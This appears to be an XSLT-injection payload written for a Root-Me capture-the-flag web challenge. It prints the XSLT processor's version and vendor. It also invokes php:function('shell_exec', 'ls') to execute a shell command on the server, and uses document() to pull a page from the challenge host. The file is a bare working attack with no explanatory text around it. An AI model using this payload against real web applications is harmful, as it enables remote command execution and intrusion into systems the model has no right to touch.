<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;color:red;background-color:#000000">
    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <p>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
	<xsl:value-of select="php:function('shell_exec', 'ls')" />
	<xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/')"/>
	<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/')"/>
	    
    </p>
</body>
</html> 
